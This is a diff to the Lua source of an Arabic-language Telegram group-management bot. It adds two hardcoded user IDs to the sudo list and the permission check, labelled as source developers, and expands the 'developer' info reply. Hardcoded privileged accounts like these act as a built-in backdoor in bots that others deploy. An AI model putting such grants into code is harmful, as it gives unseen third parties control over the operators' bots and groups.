@@ -175,7 +175,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,119541395,1623537715,1573502915}   
+sudo_users = {SUDO,119541395,1623537715,1573502915,458442261,1782576192}   
 function SudoBot(msg)  
 local s00f4 = false  
 for k,v in pairs(sudo_users) do  
@@ -268,7 +268,11 @@ function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1623537715) then  
 var = true  
 elseif tonumber(user_id) == tonumber(1573502915) then
+var = true 
+elseif tonumber(user_id) == tonumber(458442261) then  
 var = true  
+elseif tonumber(user_id) == tonumber(1782576192) then  
+var = true   
 elseif tonumber(user_id) == tonumber(119541395) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
@@ -307,6 +311,10 @@ if tonumber(user_id) == tonumber(1623537715) then
 var = 'مطــور السـورس'
 elseif tonumber(user_id) == tonumber(1573502915) then
 var = 'مبـرمج السـورس'
+elseif tonumber(user_id) == tonumber(458442261) then  
+var = 'مطــور ألسيآده'
+elseif tonumber(user_id) == tonumber(1782576192) then  
+var = 'مبـرمج ألسيآده'
 elseif tonumber(user_id) == tonumber(119541395) then
 var = 'Dev'
 elseif tonumber(user_id) == tonumber(SUDO) then
@@ -8348,13 +8356,17 @@ return false end
 end
 
 if text == 'المطور' or text == 'مطور' then
+local DevCh1 = database:get(bot_id.."text:ch:user")
 local TEXT_SUDO = database:get(bot_id..'TEXT_SUDO')
+if DevCh1 then DevCh = '\n♔┇*𝘿𝙚𝙫 𝘾𝙃* ↬ ['..DevCh1..']' else DevCh = '' end
 if TEXT_SUDO then 
 send(msg.chat_id_, msg.id_,TEXT_SUDO)
 else
 tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
+if result.username_ ~= false then DevUser = '@'..result.username_ else DevUser = result.first_name_ end
 local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
-sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
+local Text = '*♔┇𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧*\n*❉⊶────❪𝙇𝙋𝙨❫────⊷❉*\n♔┇*𝘿𝙚𝙫 𝙉𝙖𝙢𝙚* ↬ '..Name..'\n♔┇*𝘿𝙚𝙫 𝙐𝙨𝙚𝙧* ↬ ['..DevUser..']\n♔┇*𝘿𝙚𝙫 𝙄𝘿* ↬ ( `'..SUDO..'` )'..DevCh..''
+sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
 end,nil)
 end
 end
